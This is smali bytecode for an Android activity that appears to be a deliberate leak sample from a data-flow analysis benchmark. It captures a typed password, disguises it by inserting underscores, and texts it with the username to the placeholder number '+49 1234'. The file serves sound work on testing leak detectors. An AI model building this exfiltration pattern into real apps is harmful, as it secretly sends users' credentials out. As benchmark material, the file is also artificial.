.class public Lde/ecspride/PrivateDateLeakage;
.super Landroid/app/Activity;
.source "PrivateDateLeakage.java"


# instance fields
.field private user:Lde/ecspride/data/User;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 23
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 24
    const/4 v0, 0x0

    iput-object v0, p0, Lde/ecspride/PrivateDateLeakage;->user:Lde/ecspride/data/User;

    .line 23
    return-void
.end method

.method private getPassword()Ljava/lang/String;
    .locals 2

    .prologue
    .line 59
    iget-object v0, p0, Lde/ecspride/PrivateDateLeakage;->user:Lde/ecspride/data/User;

    if-eqz v0, :cond_0

    .line 60
    iget-object v0, p0, Lde/ecspride/PrivateDateLeakage;->user:Lde/ecspride/data/User;

    invoke-virtual {v0}, Lde/ecspride/data/User;->getPwd()Lde/ecspride/data/Password;

    move-result-object v0

    invoke-virtual {v0}, Lde/ecspride/data/Password;->getPassword()Ljava/lang/String;

    move-result-object v0

    .line 63
    :goto_0
    return-object v0

    .line 62
    :cond_0
    const-string v0, "ERROR"

    const-string v1, "no password set"

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 63
    const/4 v0, 0x0

    goto :goto_0
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 1
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 28
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 29
    const/high16 v0, 0x7f030000

    invoke-virtual {p0, v0}, Lde/ecspride/PrivateDateLeakage;->setContentView(I)V

    .line 30
    return-void
.end method

.method protected onRestart()V
    .locals 5

    .prologue
    .line 34
    invoke-super {p0}, Landroid/app/Activity;->onRestart()V

    .line 35
    const/high16 v4, 0x7f070000

    invoke-virtual {p0, v4}, Lde/ecspride/PrivateDateLeakage;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/widget/EditText;

    .line 36
    .local v3, "usernameText":Landroid/widget/EditText;
    const v4, 0x7f070001

    invoke-virtual {p0, v4}, Lde/ecspride/PrivateDateLeakage;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    .line 38
    .local v0, "passwordText":Landroid/widget/EditText;
    invoke-virtual {v3}, Landroid/widget/EditText;->toString()Ljava/lang/String;

    move-result-object v2

    .line 39
    .local v2, "uname":Ljava/lang/String;
    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v4

    invoke-interface {v4}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v1

    .line 41
    .local v1, "pwd":Ljava/lang/String;
    new-instance v4, Lde/ecspride/data/User;

    invoke-direct {v4, v2, v1}, Lde/ecspride/data/User;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    iput-object v4, p0, Lde/ecspride/PrivateDateLeakage;->user:Lde/ecspride/data/User;

    .line 42
    return-void
.end method

.method public sendMessage(Landroid/view/View;)V
    .locals 11
    .param p1, "view"    # Landroid/view/View;

    .prologue
    const/4 v2, 0x0

    .line 45
    iget-object v1, p0, Lde/ecspride/PrivateDateLeakage;->user:Lde/ecspride/data/User;

    if-eqz v1, :cond_0

    .line 46
    invoke-direct {p0}, Lde/ecspride/PrivateDateLeakage;->getPassword()Ljava/lang/String;

    move-result-object v8

    .line 47
    .local v8, "password":Ljava/lang/String;
    const-string v7, ""

    .line 48
    .local v7, "obfuscatedUsername":Ljava/lang/String;
    invoke-virtual {v8}, Ljava/lang/String;->toCharArray()[C

    move-result-object v4

    array-length v5, v4

    const/4 v1, 0x0

    :goto_0
    if-lt v1, v5, :cond_1

    .line 51
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v4, "User: "

    invoke-direct {v1, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v4, p0, Lde/ecspride/PrivateDateLeakage;->user:Lde/ecspride/data/User;

    invoke-virtual {v4}, Lde/ecspride/data/User;->getUsername()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v4, " | Pwd: "

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 52
    .local v3, "message":Ljava/lang/String;
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 53
    .local v0, "smsmanager":Landroid/telephony/SmsManager;
    const-string v1, "TEST"

    const-string v4, "sendSMS"

    invoke-static {v1, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 54
    const-string v1, "+49 1234"

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 56
    .end local v0    # "smsmanager":Landroid/telephony/SmsManager;
    .end local v3    # "message":Ljava/lang/String;
    .end local v7    # "obfuscatedUsername":Ljava/lang/String;
    .end local v8    # "password":Ljava/lang/String;
    :cond_0
    return-void

    .line 48
    .restart local v7    # "obfuscatedUsername":Ljava/lang/String;
    .restart local v8    # "password":Ljava/lang/String;
    :cond_1
    aget-char v6, v4, v1

    .line 49
    .local v6, "c":C
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-static {v7}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v9, v6}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "_"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    .line 48
    add-int/lit8 v1, v1, 0x1

    goto :goto_0
.end method
